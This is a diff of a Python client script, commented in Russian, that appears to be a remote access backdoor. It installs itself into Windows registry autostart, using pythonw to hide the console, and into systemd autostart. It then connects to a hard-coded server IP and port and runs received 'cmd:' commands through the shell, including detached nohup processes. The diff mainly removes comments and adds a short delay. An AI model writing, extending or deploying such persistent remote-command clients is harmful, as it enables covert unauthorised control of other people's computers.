@@ -4,7 +4,7 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.100.3"  # Замените на IP своего сервера
+SERVER_IP = "192.168.100.3"
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
@@ -21,8 +21,6 @@ def is_windows():
     return os.name == 'nt'
 
 
-# ---- Автозагрузка ----
-
 def add_to_autostart_windows():
     try:
         import winreg
@@ -32,7 +30,6 @@ def add_to_autostart_windows():
     try:
         exe_path = sys.executable
         script_path = os.path.abspath(__file__)
-        # Для корректной работы на Windows используем pythonw.exe если доступен
         if exe_path.lower().endswith("python.exe"):
             pythonw_path = exe_path[:-4] + "w.exe"
             if os.path.exists(pythonw_path):
@@ -139,8 +136,6 @@ def add_self_to_autostart():
             print("Уже добавлен в systemd автозапуск")
 
 
-# ---- Основной клиентские функции ----
-
 def main():
     try:
         add_self_to_autostart()
@@ -171,18 +166,18 @@ def main():
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
-                    # Специальная обработка команд, содержащих nohup (запуск без ожидания)
                     if "nohup" in cmd:
                         try:
                             subprocess.Popen(cmd, shell=True,
                                              stdout=subprocess.DEVNULL,
                                              stderr=subprocess.DEVNULL)
+                            # Короткая задержка перед ответом, чтобы процесс успел стартовать
+                            time.sleep(0.2)
                             s.send("Команда запущена через nohup".encode())
                         except Exception as e:
                             s.send(f"Ошибка запуска команды с nohup: {e}".encode())
                         continue
 
-                    # Обработка команд с & в конце (фоновые команды)
                     if cmd.endswith('&'):
                         cmd_no_amp = cmd.rstrip('&').strip()
                         try:
